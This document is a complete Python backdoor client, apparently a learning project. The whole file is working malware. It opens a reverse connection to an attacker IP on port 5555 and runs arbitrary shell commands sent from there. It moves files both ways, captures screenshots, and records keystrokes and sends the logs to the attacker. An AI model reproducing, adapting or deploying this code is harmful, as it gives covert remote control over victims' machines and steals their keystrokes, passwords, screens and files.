import socket
import time
import subprocess
import json
import os
import pyautogui
#import threading
import keyboard

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while True:
        time.sleep(5)
        try:
            #IP de la máquina atacante
            s.connect(('192.168.1.136', 5555))
            shell()
            s.close()
            break
        except:
            connection()


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def take_screenshot():
    global screenshot_count
    file_name = 'screenshot' + str(screenshot_count) + '.png'
    pyautogui.screenshot(file_name)
    upload_file(file_name)
    os.remove(file_name)
    screenshot_count += 1

"""
def log_keys():
    global keylogs
    global keylogger
    f = open('keylogger' + str(keylogs) + '.txt', 'wb')
    while keylogger:
        f.write
"""


def shell():
    while True:
        command = reliable_recv().split()
        if command[0] == 'quit':
            break
        elif command[0] == 'cd':
            os.chdir(command[1])
        elif command[0] == 'clear':
            pass
        elif command[0] == 'download':
            upload_file(command[1])
        elif command[0] == 'upload':
            download_file(command[1])
        elif command[0] == 'screenshot':
            take_screenshot()
        elif command[0] == 'keylogger':
            global keylogger
            global keylogs
            #global keylog_thread
            if not keylogger:
                keyboard.start_recording()
                keylogger = True
                #keylog_thread.start()
            else:
                """while keylog_thread.is_alive():
                    pass"""
                f = open('keylog' + str(keylogs) + '.txt', 'w')
                keys = keyboard.stop_recording()
                for key in keys:
                    f.write(str(key))
                f.close()
                #reliable_send('OK')
                upload_file('keylog' + str(keylogs) + '.txt')
                keylogs += 1
                keylogger = False
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

screenshot_count = 0
keylogger = False
keylogs = 0
#keylog_thread = threading.Thread(target=log_keys)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
